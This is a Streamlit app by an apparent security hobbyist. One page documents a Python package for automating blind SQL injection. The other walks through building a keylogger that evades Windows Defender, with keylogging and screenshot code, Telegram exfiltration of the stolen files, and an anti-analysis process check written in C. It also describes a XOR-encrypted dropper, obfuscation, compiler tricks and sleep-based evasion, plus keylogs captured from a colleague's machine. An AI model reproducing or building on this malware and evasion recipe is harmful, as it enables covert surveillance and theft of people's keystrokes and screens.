import streamlit as st
from datetime import datetime, time
import numpy as np
import matplotlib.pyplot as plt




def page_1():
    st.title("PuzzleSQL : Package to automate your SQL injection 💉")
    st.write("This page is the documentation page of the PuzzleSQL package available in my github")
    st.markdown(
        """
        **PuzzlesSQL** is a Python package designed to simplify and speed up the automation of SQL injections (SQLi). It offers pre-built functions that users can assemble to create custom scripts. Currently, it supports time-based and error-based SQL injections, with plans to expand to other types of SQL injections in the future.
        """
    )

    st.markdown("[Link to GitHub repository](https://github.com/Fournoy/PuzzlesSQL)")

    st.header("Main Features")
    st.markdown(
        """
        - **SQL Injection Automation**: Provides functions to automate time-based and error-based SQL injections.
        - **Customization**: Users can assemble functions like puzzle pieces to create scripts tailored to their specific needs.
        - **Evolving Support**: Plans to extend support to other types of SQL injections in the future. :red[Also, i will extend the package to use 
        bypass WAF technics and out-of-band SQL injection with DNS/HTTP server.] 
        """
    )
    
    st.subheader("What else does PuzzleSQL offer ? ")
    st.write("""Apart for its automated SQLi functionality (not like SQLmap!), PuzzleSQL use binary search. 
            Binary search is a computer technique used to perform searches by dividing data into two parts, based on the position of the “middle”.
            One of the two halves is eliminated, and this is why we gain time. When we study the computational complexity of the binary search
            we can see that we have a O egal to log(2n). The linear search have a O egal to n. For high number of value, the binary search is better
            than the linear search. Especially for Blind SQLi when we try to take a password or information.
             """)
    
    col1, col2 = st.columns(2)
    
    with col1:
        def calcul_log(n):
            return np.log(2 * n)

        st.subheader("Graphics for log(2n)")
        n_max = 20
        n_values = np.arange(1, n_max + 1)
        log_values = calcul_log(n_values)

        fig, ax = plt.subplots()
        ax.plot(n_values, log_values, label="log(2n)", color="blue")
        ax.set_xlabel("n")
        ax.set_ylabel("log(2n)")
        ax.set_title("Graphic of log(2n)")
        ax.grid()
        st.pyplot(fig)
    with col2:
        def calcul_linear(n):
            return n

        st.subheader("Graphics for n")
        n_max = 20
        n_values = np.arange(1, n_max + 1)
        log_values = calcul_linear(n_values)

        fig1, ax1 = plt.subplots()
        ax1.plot(n_values, log_values, label="n", color="blue")
        ax1.set_xlabel("n")
        ax1.set_ylabel("n")
        ax1.set_title("Graphic of n")
        ax1.grid()
        st.pyplot(fig1)
        
    st.markdown("<h2 style='text-align: center;'>Good ! Now, let's explain how to use and how work the PuzzleSQL package ! 🧑‍💻</h2>", unsafe_allow_html=True)
    
    st.write("""PuzzleSQL offer different function to make SQL injection. FOr exemple, you can make time based SQLi and boolean_based SQLi.
    But what if i want to make an error SQLi, and look at the content of the web page for the process ? Unfortunately, this is not avalaible yet
    in PuzzleSQL, but i will make this as soon as possible. """)  
        
    ##########################################################################
    #Binary function explanation 

    st.subheader("The binary search function : 🧮")
    
    st.write("""They are two sort of `binary_search_function`. The first use boolean input and can be use for every type of blind SQLi, or SQLi.
    The second function uses HTTP code as input. Despite the difference, the main process is similar. Let's see the function quickly.""")
    
    code = """def binary_search_boolean(result_bool: bool, operator1: str, hight: int, low: int, binary_average: int) -> int:
    if result_bool == True and operator1 =='<':
        hight = binary_average - 1
    if result_bool == True and operator1 =='>':
        low = binary_average + 1
    if result_bool == False and operator1 == '>':
        hight = binary_average - 1
    if result_bool == False and operator1 == '<':
        low = binary_average + 1
    return hight,low,binary_average"""
    
    st.code(code, language='python')
    st.markdown("<h3 style='text-align: center;'>Overview of the function</h3>", unsafe_allow_html=True)
    
    st.write("""The `binary_search_boolean` function is used to refine the boundaries of a binary search based on a boolean result from an SQL injection test. 
    This helps determine the correct numerical value by narrowing down the possible range. 
    Here, the binary_average is not updated, of course it's belong to you to update the binary_average when you need it.
    It will be the same thing for the second binary search function.
    """)
    
    st.markdown("<h3 style='text-align: center;'>Parameters</h3>", unsafe_allow_html=True)
    
    st.write("""
    - ***result_bool*** (bool): The result of the last boolean-based SQL injection condition (e.g., True if the condition was met, False otherwise).
    - ***operator1*** (str): The comparison operator used in the SQL condition ('<' or '>').
    - ***hight*** (int): The upper bound of the search range.
    - ***low*** (int): The lower bound of the search range.
    - ***binary_average*** (int): The midpoint of the current search range.
    """)
    
    st.markdown("<h3 style='text-align: center;'>Function Logic</h3>", unsafe_allow_html=True)
    
    st.write("""
        - If ***result_bool** is True and ***operator1*** == '<', the upper bound (***hight***) is moved below ***binary_average*** - 1.
        - If ***result_bool*** is True and ***operator1*** == '>', the lower bound (***low***) is moved above ***binary_average*** + 1.
        - If ***result_bool*** is False and ***operator1*** == '>', the upper bound (***hight***) is moved below ***binary_average*** - 1.
        - If ***result_bool*** is False and ***operator1*** == '<', the lower bound (***low***) is moved above ***binary_average*** + 1.
    """)
    
    st.markdown("<h3 style='text-align: center;'>Return Value</h3>", unsafe_allow_html=True)
    
    st.write("""The function returns the updated int values of hight, low, and binary_average.
    they will be use later in the code (*see the EXEMPLE file*). These value are very important for the research of data.
    For exemple in SQLi time based, we will use theses values to know which letter/number composes the password of a account.              
    """)
    
##########################################################################
# Concernant les fonctions principales du package

    st.subheader("Sendings payloads functions : 📡")
    
    st.write("""In this section, we are going to examine a function used for testing time-based SQL injection vulnerabilities. 
    The function `sending_payload_for_time_based_SQLi_getv` sends two HTTP requests with different payloads and measures the response time to determine whether a parameter is vulnerable based on the delay in the server's response.
    This method is typically used in time-based SQL injections where the response time varies based on the injected condition.""")

    code= """def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, cookies1: None, cookies2: None) -> bool:
    
    start_time = time.time()
    r = requests.get(url, cookies=cookies1)
    end_time = time.time()
    result_bool = (end_time - start_time) 
    if result_bool >= 5:
        result_bool = True
        print(f"This parameter work: {payload_parameter1}")
    else:
        result_bool = False
        print("")    
            
    start_time = time.time()
    r = requests.get(url, cookies=cookies2)
    end_time = time.time()
    result_control = (end_time - start_time)
    if result_control >=5:
        result_control = True
        print(f"Value found with this parameter: {payload_parameter2}")
    else:
        result_control= False
        print("")    
        
    return result_bool, result_control"""
    
    st.code(code, language='python')
    
    st.markdown("<h3 style='text-align: center;'>Overview of the Function</h3>", unsafe_allow_html=True)

    st.write("""The `sending_payload_for_time_based_SQLi_getv` function is designed for use in time-based SQL injection testing. It works by sending two HTTP GET requests to a target URL, each with different payloads, and then measures the response time to determine if there is a noticeable delay indicative of a successful injection. 
    A delay greater than a certain threshold (in this case, 5 seconds) is interpreted as a sign that the payload has triggered an action on the server, signaling a potential vulnerability.""")
        
    st.markdown("<h3 style='text-align: center;'>Parameters</h3>", unsafe_allow_html=True)

    st.write("""
        - ***payload_parameter1*** (str): The first parameter for the payload test.
        - ***payload_parameter2*** (str): The second parameter used to bypass false-positive.
        - ***url*** (str): The target URL for the SQL injection test.
        - ***indice*** (int): An index used for the particularity of the SQL injection ([see exemple file](https://github.com/Fournoy/PuzzlesSQL/blob/main/EXEMPLE_time_based_SQLI_main.py)).
        - ***cookies1*** (None): The first set of cookies to be included in the first HTTP request.
        - ***cookies2*** (None): The second set of cookies to be included in the second HTTP request.
    """)

    st.markdown("<h3 style='text-align: center;'>Function Logic</h3>", unsafe_allow_html=True)

    st.write("""
        - The function sends an HTTP GET request to the target URL with the first set of cookies and measures the response time.
        - If the response time is greater than or equal to 5 seconds, it considers this as a successful test for the first parameter and marks it as `True`.
        - The function then repeats the process with the second set of cookies and checks the response time again.
        - If the response time for the second parameter is greater than or equal to 5 seconds, it marks this as a success for the second parameter as well.
        - Both tests are performed because if the value = a and the first query is &gt;a or &lt;a, the response will of course be FALSE. 
        So, to avoid a false negative, we send another query with =a in the payload.
    """)

    st.markdown("<h3 style='text-align: center;'>Return Value</h3>", unsafe_allow_html=True)

    st.write("""The function returns two boolean values:
        - ***result_bool***: `True` if the first payload results in a response delay of 5 seconds or more, otherwise `False`.
        - ***result_control***: `True` if the second payload results in a response delay of 5 seconds or more, otherwise `False`.
        
    These values are used to determine whether the parameters are vulnerable to time-based SQL injections. 
    The response time threshold is adjustable, but it is commonly set to 5 seconds in this example. """)



                                        ########## Page 2 ##########



def page_2():
    
    st.markdown(
    """
    <div style='background-color:#0e1117;padding:20px;border-radius:10px'>
        <h1 style='color:#00FFAA;text-align:center'>How a keylogger can bypass Windows Defender ?</h1>
        <p style='color:#CCCCCC;text-align:center'>⚠️ Educational context only - Lab simulation</p>
    </div>
    """,
    unsafe_allow_html=True
)
    
    st.write("""
- ***Language*** : While malware can be written in C/C++, PowerShell, Bash, or VBScript, this implementation uses **Python** for its simplicity and readability in a research setting.
More advanced components (e.g. rootkits) would likely require C/C++ to interact with syscalls. But for our **educational keylogger**, we stick to Python.

- ***Target OS*** : The testbed environment is a **Windows-based virtual machine**. We restrict our testing and simulations to this OS only.

- ***Functionalities*** :
    - **Keylogging** using Python modules (e.g., `pynput`)
    - **Screenshot capture**
    - **Data exfiltration simulation** (e.g., sending to local Telegram test bot)

- ***Attacker-side simulation*** : Logs and screenshots are sent to a **local server or Telegram bot in a test environment**. We explore the idea of using AI for future parsing but do not implement it at this stage.

- ***Detection & Stealth*** : The key focus of this research is **evasion**. Building the logger is not the challenge; staying undetected is. Thus, we also investigate:
    - How AV solutions detect Python malware
    - Techniques to reduce the detection surface (e.g., obfuscation, syscall-based execution, etc...)
""")
    
    st.markdown("<h3 style='text-align: center;'>Let's begin this very interesting journey ! </></h3>", unsafe_allow_html=True)
    
    st.write("""
             For the first step, we choose the language. Here the keylogger will use Python for the main functionnality.
            Tacking screenshot, registered keylog and sending the photos (in zip) and log throught internet directly in a telegram server.
            He will also use functionnality like XOR-decryption and will place the file in TEMP repository. Theses deXORed
            files will containes all the functionnality. We will run the script directly with an "exec()" function in order
            to run the keylogger directly into the code.
            
            Also, the keylogger will have a dll file writing in C. The main purpose here is to provide the virus with 
            AV detection functionnalities. We will see that later.             
    """)    
    
    st.markdown("<h2 style='text-align: center;'>Functionnalites:</></h2>", unsafe_allow_html=True)

    st.info("Here, we will see what types of functionnalites we will use for the keylogger")
    
    st.markdown("<h3 style='text-align: left;'>Keylogging</></h3>", unsafe_allow_html=True)
    
    st.write("""
             
    The keylogger need of course to log every key typed in the keyboard. For that we have several things.
    We can use hook function in order to intercept the input of the target. For that we can use the API windows. In python
    we have win32 module to use API function by windows. But we will use Pynput module, more especially the keyboard class.
    With that, we can with simplicity, log the key typed by the target in his keyboard. The module use WinAPI, so we need to be 
    careful using it. We have higher chance to trigger the AV. 
    
    The thing we can do, is to use syscall function, undocumented function used in windows to not trigger the AV. But 
    it's way more complicated i will not do that for now.             
             """)
    
    
    keylogger_code = r"""
    def on_press(self, key):
        with open(self.log_file,'a') as f:
            if key  == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.backspace:
                f.write(' *backspace* ')
            else: 
                key_str = str(key).strip("'")
                (f.write(f"{key_str}"))     
    
    """
    
    
    st.warning("Here the python code for the keylogging functionnality :")
    
    st.code(keylogger_code, language="python")
    
    st.write("""As you can see, we using pynput library with keyboard class to hook the key pushed by the target.
    I ajust the function with little modification around the output to help myself to reading more efficiantly 
    the log file. But as you can see, i just converted three key, caracteres like '&','@' and so on, will be place 
    with their proper pynput markup.""")
    
    st.write("""The magic operate around the on_press() function. It will open a file (placed in the TEMP repository) and will 
    append as much as key are pushed by the target. It will traduced when it can, and will remove unnecessary string like " ' ".
    Threading function (you can't see them) are placed in order to managed more correctly the different functionnalities of the malware.
    start, stop, pause and resume are used in the main file of the malware in order to prevent from race condition. 
    """)
    
    st.info("Now, let's see the second class used by the malware")
    
    sysinfo_code = r"""    
    def os_information(self):
        os_inf_gath = platform.platform()

        file_path = tempfile.gettempdir()  # Exemple => C:\Users\Username\AppData\Local\Temp
        os.makedirs(file_path, exist_ok=True)

        log_file = os.path.join(file_path, self.log_file_name)
        name_target = os.environ.get('COMPUTERNAME')
        with open(log_file,'a') as f:
            timestamp = datetime.datetime.now().strftime("Jour: %Y-%m-%d__Heure: %H-%M-%S")
            f.write(f"---OS INFORMATION -> {os_inf_gath} : {timestamp} => {name_target}\n")
        return log_file
    
    def screen_shot(self):
        os.makedirs(self.screen_file_name, exist_ok=True)
        while True:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            
            screenshot_path = os.path.join(self.screen_file_name, f"screenshot_{timestamp}.png")
            
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            print(f"Screenshot saved: {screenshot_path}")
    """
    
    
    st.code(sysinfo_code, language="python")
    
    st.write("""
              This module collects OS information and takes periodic screenshots using PIL.ImageGrab. 
              Like with the keylogger, this is purely simulated in a local lab environment. The main goal here, is to have
              as most information as we can. We can also exflitrate files and repositorys but we i will not do that for this keylogger.
              Like the first code, we ajust it with new functions in order to prevent from race condition (very important)
             """)
    
    st.warning("Little warning concerning these functions :")
    
    
    st.write("""
    These function use pynput module and pynput module use Windows API. In other word, this is VERY bad.
    Using python forced us to use function throught Windows API. Wht this is bad ?
    **AV detecte it**. AV hook API function and will detecte  if a program run some of these functions. 
    It's for that malware use Undocumented Function, or, **Syscall**. **Syscall** are very important if you want to evade AV.
    But of course, using it with python is not the best idea, for that we need to use C language, but we will see that later. 
    Let focus on python code and pynput module. We pratically shoot in our feet but it's a good challenge.
    """)
    
    st.markdown("<h3 style='text-align: center;'>What next ?</h3>", unsafe_allow_html=True)

    st.info("""We have the main function used by the malware, now, we will talking about exfiltration.       
        """)
    
    url = "https://www.cyfirma.com/research/lumma-stealer-tactics-impact-and-defense-strategies/"

    st.write("""Before talking about the C part, we need to see how to exfiltrate our stolen data.
    For that let's see how other virus work, for exemple [Luma Stealer](%s)
    Luma Stealer use a remote server C2 (Command & Control), for this first malware we will not do that. But the thing is 
    we need a server to exfiltrate data, a server like a web server.
    """ % url)
    
    st.markdown("<h3 style='text-align: center;'>Discord case</h3>", unsafe_allow_html=True)
    
    url ="https://www.cyfirma.com/research/technical-malware-analysis-report-python-based-rat-malware/"
    st.write("""
    For exemple, like in this [Python RAT malware](%s), we can use discord to exfiltrate data. At first place, i was doing this (using
    discord webhook) but i met a problem while testing my Keylogger **Discord BOT**. They just close the server for non-compliance with the user charter.
    It's fair enought, but i need a server to exfiltrate the stolen data. For that, and like (maybe) most of the malware actually,
    we will use ***Telegram***.
            """ % url)

    st.markdown("<h3 style='text-align: center;'>Telegram case</h3>", unsafe_allow_html=True)
    
    st.write("""
        In fact, this is a good idea. It's pretty clean, pretty simple to use it and we can access to the server everywhere.
        **BUT**, AV can maybe detected it. We not talking about Windows Defender (on it's own) but some AV and EDR (Endpoint Dection and Response)
        can detected packet send to Telegram, because of the hight use of it by malware. So keep in mind that this malware can be used
        only against Windows Defender. One day we will level up, but for now let's focus on our purpose.
             """)

    st.markdown("<h2 style='text-align: center;'>Exfiltration</h2>", unsafe_allow_html=True)
    
    st.write("""
            To exfiltrate data we need to send packet to a server. We will use Telegram bot with Telegram API in order to send
            data. But what type of format ? Stolen datas will be file (keyboard log) and zip file (screenshots). Telegram allow us
            to send them to a private room, so this is good. But it's important to understand that in a reel scenario, Telegram is not
            the best choice. Having our own remote server is better. The exfiltration will perhaps not be stoped by EDR and some of AV 
            and we have a full control on the remote server. Of course, you can use every type of server, even google drive or 
            why not X (twitter), but in fact having control on data flux, data treatment and so on are more important,
            and you need to not be flagged by these provided services. You can reach to some of well know malware to see that
            they use generally they own server. 
             """)
    
    
    code_exfiltration = """
    def telegram_sender(file_path, file_name, chat_id):
        file_path = os.path.join(file_path, file_name) 
        with open(file_path, 'rb') as f:
            file = {'document': f}
            data = {'chat_id': chat_id}
            requests.post(url, file=file, data=data)  
    """
    
    st.code(code_exfiltration, language="python")
    
    st.write("""
             Let's dive into the best part of macking malware (and most difficult) the **EVASION** technics. 
             """)
    
    st.info("How we will evade Windows Defender for this keylogger ?")
    
    # Example: Three columns in Streamlit

    col1, col2, col3 = st.columns(3)

    with col1:
        
        response1 = st.button("Using XOR encryption, Syscall function and obfuscation")
        
        if response1:
            
            st.success("Yes ! Let's have a deepest look into it !")
        

    with col2:
        
        response2 = st.button("Using only full obfuscation and Windows API")
        
        if response2:
            
            st.warning("No...")


    with col3:
        
        response3  = st.button("Using steganography for the dropper and Sycalls functions")
        
        if response3:
            
            st.warning("No...")
    
    st.write("")
        
    st.markdown("<h2 style='text-align: center;'>Evasion Technics</h2>", unsafe_allow_html=True)
    
    st.write("In fact, a lot of technics can be used, but for this keylogger we will prefer this one you choose.")
    
    url3="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-1/"
    
    st.write("""
        First of all, you can reach further to understand the assignement with this [link.](%s) Now let's see how this work.
        First it's important to understand that we using different technics, from XOR to Syscall and passing throw obfuscation and 
        even Clang option on nuitka, all these technics will help us to evade AV. We cannot use just one and hope that
        it will work. To evade AV, we need to have different approch and to play with new trends.                 
                """ % url3)
    

    st.markdown("<h3 style='text-align: center;'>Syscall Function</h3>", unsafe_allow_html=True)
    
    url4="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/"
    
    url5="https://0xpat.github.io/Malware_development_part_2/"
    
    st.write("""
    Syscalls play a critical role in malware programming, see this [link](%s). As I mentioned earlier, antivirus software often monitors Windows API functions. 
    They hook into these APIs to analyze program behavior during dynamic analysis, and certain API calls can trigger detection. So,
    to avoid theses, you need to use undocumented windows functions. The function we will make here, is a technics used to avoid analysis
    in our program. When running, before getting on, it will see if any malware analysis software is in use in the target system. If it's true,
    the keylogger will stop himself and will not run, in order to avoid analysis. I choose this only technics, using Syscall (undocumented windows function)
    but you have a lot of these.
             """ % url4)
    
    st.write("""
    [Here](%s) you have exemple of avoiding malware analysis, outside and inside à sandbox. The best technics shown in the paper is to detected
    physical compenent inside the system you running on. For exemple, a sandbox using by AV will have two CPU. So, if the code find less than two running CPU,
    it will stop his execution. For our project we will choose something different. The malware will first examine all the running processes,
    will compare the programm with a black-list. In case of true-case, the execution will stop immediatly. But to do this, we will use C language.
    To make it, we can use Windows API and play with these function but the risk is the AV will detect it. We already using WIN API for the keylogging
    we need to do different now, in addition, this is one of the first execution so we need to be discret. Let's use Syscall !
             """% url5) 
    
    
    syscall_evasion_code =r"""
    int main() {
        HMODULE hNtdll = LoadLibraryA("ntdll.dll");

        typedef NTSTATUS (WINAPI *NtQuerySystemInformation_t)(
            ULONG SystemInformationClass,
            PVOID SystemInformation,
            ULONG SystemInformationLength,
            PULONG ReturnLength
        );

        NtQuerySystemInformation_t NtQuerySystemInformation =
            (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

        ULONG bufferLength = 1024 * 1024;
        PVOID buffer = malloc(bufferLength);
    
        ULONG returnLength = 0;

        NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferLength, &returnLength);
        PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)buffer;
        
        const wchar_t* list_tools_analysis[] = {
            L"ida.exe",
            L"procexp.exe",
            L"windbg.exe",
            ...
            NULL
        };
        while (TRUE) { 
                for (int i =0;  list_tools_analysis[i] != NULL; i++){    
                    if (current->ImageName.Buffer != NULL) {
                        wchar_t* filename = wcsrchr(current->ImageName.Buffer, L'\\');
                        if (filename) filename++; else filename = current->ImageName.Buffer;
                        if (wcsicmp(filename, list_tools_analysis[i]) == 0) {
                            free(buffer);
                            return FALSE; //Will return FALSE and stop the execution
                        }
                    } 
                current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current->NextEntryOffset);

        }
 
        return 0;
    }    
    """
    
    
    st.code(syscall_evasion_code,language="c")   
    
    
    st.write("""
    The code was pretty hard to use, thankfully i was help with AI to make it correctly. They are also tools like SysWhispper2 giving pre-built
    Syscall. You will find documentation about Sycall in the complentary source part. Syscall are complicate to use, it was the hardest part of the 
    malware. It took me several time to obtain a full functionnal code to make it right. Like you can see, it will compare with the black-list
    manually incorporated in the main code. Let's see how it look like when execute it.
             
             """)
        
    
    
    av_evasion_poc = r"video\video_poc_protection.mp4"
    
    st.video(av_evasion_poc, format="video/mp4", start_time=0, subtitles=None, loop=True, autoplay=False, muted=True)  

    st.success("Nice !")  
    
    
    st.markdown("<h3 style='text-align: center;'>Obfuscations Methods</h3>", unsafe_allow_html=True)
    
    st.write("""
    Obfuscation is the part changing everything when i created the keylogger. In first place, i used Pyinstaller to make an exe of my python code.
    And windows trigger it, sometimes don't, but for a short period of time (few hours) before to get stop when execute it. So i choose another tools, 
    **Nuitka**. Using it with default parameter was not the best option at first place. With basic compilation using CL compiler and with only obfuscation in the python code,
    the executable triggered the AV each time i compile it, so i can't even see the file being created in the directory !
             """)
    
    image_poc_1="image\cl_bad_compiler.jpg"
    
    st.image(image_poc_1, caption="Traduction and Compilation with Nuitka using CL compilator")
    
    st.write("""
    As you can see, using cl compilator, even if we use code obfuscation in the python code, will not work. But why ?
    - First : Using only python code obfuscation is not enought. For the keylogger, i inject junk code, i change the variable etc... to make it 
    the most incomprehensible possible. Here an exemple of how it look like :             
    """)
    
    
    python_code_obfuscation = """
    
    iiiIIIiiIIiiI = 1
    
    for iiiIIIiiIIiiI =1:
        OOoooOOoOo= 2
        pass
    
    for OOoooOOoOo + iiiIIIiiIIiiI = 2:
        continue
    else:
        IiiIIIiiII = 5
    
    def main():
        main code
        ...
        iiiIIIiiIIiiI = 1
    
    for iiiIIIiiIIiiI =1:
        OOoooOOoOo= 2
        pass
    
    for OOoooOOoOo + iiiIIIiiIIiiI = 2:
        continue
    else:
        IiiIIIiiII = 5
    """
    
    st.code(python_code_obfuscation, language="python")
    
    url6="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/"
    
    st.write("""
    And i even not change the variable. In fact, i only use the junk code. The main thing that change everything it using [XOR encryption](%s).
    To make it right, we will use a dropper. The dropper will be the code that execute the main code of the malware. It will search for files and
    execute it directly into the code (like i explain before). It will be the executable file, the other will stay XORed file. 
             """ % url6)
    
    
    st.markdown("<h3 style='text-align: center;'>Nuitka, Clang and LLVM</h3>", unsafe_allow_html=True)

    url_forum="https://github.com/Nuitka/Nuitka/issues/2163"
    st.write("""
    The obfuscation problem steal remain because of the compilation using nuitka and cl (windows compilator). For that, we will use an LLVM based
    compilator. It will use the front-end of it and this will be a game changer, this is *--clang* option. 
    Here we're going deep in the PE format file on windows, so take a look in sources complentary to go further.
    When using cl compilator with Nuitka, Windows Defender always detect it, even before stop to finish the compilation, a reel blocage.
    I got this message : Program:Win32/Wacapew.C!ml
    Searching on forum, article etc... I found that sometimes, even with legitim software, windows can be triggered. Like this [one](%s).
    """ % url_forum)
    
    url_forum_2="https://github.com/actions/runner-images/issues/9403"

    st.write("""Like the guy in the forum, i was using nuitka with default compilator (cl.exe), and i have a clue. Microsoft toolset when compilating create
    a Rich header on the PE file. This rich header, in addition with other static analysis technics, is used to make corresponding with malware.
    As an exemple you can see [someone](%s) using clang-cl in Visual Studio, so with microsoft toolset, so with Rich Header, and it still be triggered by
    the windows defender. So i go deeper in the rich header and i found that it serve to know information in the PE format, like the technologies (import
    resources, language used) in it, so Rich header can be used as a signature or fingerprint.
    """ % url_forum_2)
    
    st.write("""
    But with nuitka and the *--clang* option, i found that the Rich header doesn't exist at all. With PE-Bear i analysed the dropper
    (only executable file of the malware) and the Rich Header is unvailable, because of the use of clang compilator.        
             """)
    st.image("image\pe_bear.jpg", caption="The Rich header hash is not available, because the ReaderHash doesn't exist")
    st.write("""
    Without the Rich Header, Windows Defender lost a identificator fragment. At this point, i didn't found information about why i can bypass 
    windows defenders without the Rich Header, maybe this PE header fragment have no importance in static analysis (perform by Windows Defender),
    but it would be strange. Obfuscation in the code, and the use of LLVM front-ed transform completly the code and will maybe 
    play as a obfuscation, that's why Windows Defender will not be trigger during the compilation (with junk code in it of course).
    At this stage, it's more  a deduction than a reality, so take it with a pinch of salt. 
             """)
    

    st.markdown("<h3 style='text-align: center;'>Dynamic problem</h3>", unsafe_allow_html=True)
    
    st.image("image\Capture d'écran 2025-07-16 125957.png", caption="Windows Defender dectect dynamically the malware for the first time")
    st.image("image\Capture d'écran 2.png", caption="It's the exact same dropper but with a different security message...")
    
    st.write("""
    In first, even before using clang, the malware was a one-file type. But i rapidly see  that it would be always triggered because of the
    obvious behavior of the malware. So i needed to change the functionment. For that i dislocate the malware in five files. Two for the main 
    function (keylogging and telegram sending) and two other for the protection function again'st analysis and for the main file (the orchestrer).
    The dropper is the fifth file, the only executable function, the other are just XOR encrypt files. The dropper will 
    all-in-one, deXORred files and run it "inside himself", in other world, run into the execution with an exec() (python) function. 
    With that, we can bypass static analysis AND dynamic analysis (in a certain way). But we will not play the main code directly, we need to be smooth.
             """)
    
    st.write("""
    At first place, the malware work in my lab. I was happy and very excited to right this report. But, when i testing it in a other computer, 
    windows defender triggered it directly because of DYNAMIC analysis (again...). I was lost, how can i make this virus (using **API Windows**) the most
    descrete possible. I start to reach some technics, maybe using Syscall for all the function using Windows API, but i was to way for that.
    So i start to play with the behavior of the malware. I added a simple *time.sleep(20)* in the dropper to see if it will work, i've seen that
    one day in a paper. 
    And miraculously, windows defender wasn't able to detect it, even after few days. So we can confirm that statically, the keylogger bypass windows defender.
    And now, with the waiting time, it can bypass dynamic analysis perform by windows defender.
    
    It's legitimate to know which configuration i made with Windows Defender, in fact everything was on even the protection against ransomware
    but with the default parameter (of course). So running from the desktop will trigger nothing (not the same story into the documents repository, 
    AV will detect that a executable play with files and repository, but will not flag like a malware).
    The only disable parameter is the smart app control (i wasn't able to activate it). 
    
    **Now, i'm happy to show you the keylogger !** test on my computer collegue.
             """)
    
    keylogger_in_action=r"video\New_proof_20s_malware.mp4"
    
    st.video(keylogger_in_action, format="video/mp4", start_time=0, subtitles=None, loop=True, autoplay=False, muted=True) 
    
    st.markdown("<h2 style='text-align: center;'>Screenshot data</h2>", unsafe_allow_html=True)

    st.write("After 15min, the malware send to my telegram server the keylog and the screenshot in a zip file :")
    
    col1, col2 = st.columns(2)

    with col1:
        
        st.image("image\screenshot1.png", caption="Screenshot during internet research")

    with col2:
        
        st.image("image\screen_certi.png", caption="Another screenshot")
        
    
    st.markdown("<h2 style='text-align: center;'>Keylog data</h2>", unsafe_allow_html=True)
    st.write("During the execution, the malware registered the key used by the target :")
    
    proof_keylog=r"""
    ---OS INFORMATION -> Windows-11-10.0.26100-SP0 : Jour: 2025-07-10__Heure: 15-49-40 => DL5420
http debugger
certfi *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace* hello this is a other test !!! :) 
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace* certi
Key.cmdKey.tabjhgjygyjgjKey.esc
    """
        
    st.code(proof_keylog)    

    
    
    st.write("""It's horrible to read, i was to lazy to make a code for convert it into a readable text, 
    so with LLM and manually, i change the original file and i get this. Using LLM can be intersting for files with lot of data.""")
    
    proff_keylog_stealh="""OS INFORMATION -> Windows-11-10.0.26100-SP0
    Jour : 2025-07-10
    Heure : 15-49-40
    Name's target => DL5420

    *During research on browser* => http debugger
    *Search a certificate* => certfi
    hello this is a other test !!! :)
    *Management of certifications in order to use http_debugger* => certi
    *???* => Key.cmdKey.tabjhgjygyjgjKey.esc
    """
    st.code(proff_keylog_stealh)
    
    st.write("As you can see, we can elaborate an understanding of what the target doing with screenshot AND keylog.")
     

    
    


    
    
    
    
    ### Source Side
    source1="https://www.gdatasoftware.com/blog/2020/05/36068-current-use-of-virtual-machine-detection-methods"
    source2="https://andreafortuna.org//2018/05/21/malware-vm-detection-techniques-evolving-an-analysis-of-gravityrat/"
    source3="https://0xpat.github.io/"
    source4="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSystem%20Information%2FNtQuerySystemInformation.html"
    source5="https://learn.microsoft.com/fr-fr/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation"
    source6="https://0xpat.github.io/Malware_development_part_2/"
    source7="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/"
    source8="https://offwhitesecurity.dev/malware-development/portable-executable-pe/rich-header/"
    source9="https://0xrick.github.io/win-internals/pe3/#rich-header"
    source10="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format"
    source11="https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/"
    
    st.markdown("<h3 style='text-align: center;'>Complementary Sources</h3>", unsafe_allow_html=True)
    st.write(f""" 
             
    *General Technics for malware writing*
    - {source3}
    - {source7}
             
    *Evasion Technics using hardware analysis* : 
    - {source1}        
    - {source2}
    - {source6}
    
    *Syscall Function*
    - {source4}
    - {source5}
    
    *Static Analysis (PE Header, Rich header, Clang...)*
    - {source8}
    - {source9}
    - {source10}
    - {source11}
             
             
             
             """)

    

    
    

    
    
        
    
    







